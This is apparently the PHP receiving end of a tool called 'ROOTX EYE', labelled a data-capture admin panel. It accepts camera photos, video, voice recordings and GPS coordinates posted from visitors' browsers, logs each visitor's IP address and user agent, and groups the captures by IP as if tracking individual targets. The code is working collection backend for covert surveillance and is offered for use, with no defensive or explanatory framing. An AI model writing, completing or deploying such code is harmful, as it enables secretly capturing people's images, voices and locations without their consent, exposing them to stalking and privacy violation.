<?php
// ============================================
// ROOTX EYE — DATA CAPTURE (Admin Panel)
// TERA ORIGINAL LOOK + IP-BASED GROUPING
// ============================================

$data_dir = 'data/';
$captures_file = $data_dir . 'captures.json';

// Create directory if not exists
if (!is_dir($data_dir)) {
    mkdir($data_dir, 0777, true);
    mkdir($data_dir . 'photos', 0777, true);
    mkdir($data_dir . 'videos', 0777, true);
    mkdir($data_dir . 'audio', 0777, true);
}

// Load existing data
$all_data = [];
if (file_exists($captures_file)) {
    $all_data = json_decode(file_get_contents($captures_file), true) ?: [];
}

// Get data from POST/GET
$type = $_POST['type'] ?? $_GET['type'] ?? 'unknown';
$ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$time = date('Y-m-d H:i:s');

// Build capture array
$capture = [
    'type' => $type,
    'ip' => $ip,
    'user_agent' => $user_agent,
    'time' => $time,
    'file' => '',
    'lat' => null,
    'lng' => null
];

// Handle file upload
if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
    $file = $_FILES['file'];
    
    $ext = 'jpg';
    $subdir = 'photos';
    if ($type == 'video') {
        $ext = 'mp4';
        $subdir = 'videos';
    } elseif ($type == 'voice') {
        $ext = 'mp3';
        $subdir = 'audio';
    }
    
    $filename = $type . '_' . time() . '_' . rand(100, 999) . '.' . $ext;
    $filepath = $data_dir . $subdir . '/' . $filename;
    
    if (move_uploaded_file($file['tmp_name'], $filepath)) {
        $capture['file'] = $filepath;
    }
}

// Handle location data
if (isset($_POST['lat']) && isset($_POST['lng'])) {
    $capture['lat'] = floatval($_POST['lat']);
    $capture['lng'] = floatval($_POST['lng']);
}

// 🔥 IP-BASED GROUPING — SAME IP = SAME USER
$found = false;
foreach ($all_data as &$user) {
    if ($user['ip'] == $ip) {
        $user['captures'][] = $capture;
        $found = true;
        break;
    }
}

if (!$found) {
    $all_data[] = [
        'ip' => $ip,
        'user_agent' => $user_agent,
        'first_seen' => $time,
        'captures' => [$capture]
    ];
}

file_put_contents($captures_file, json_encode($all_data, JSON_PRETTY_PRINT));

header('Content-Type: application/json');
echo json_encode(['status' => 'success', 'ip' => $ip]);
?>
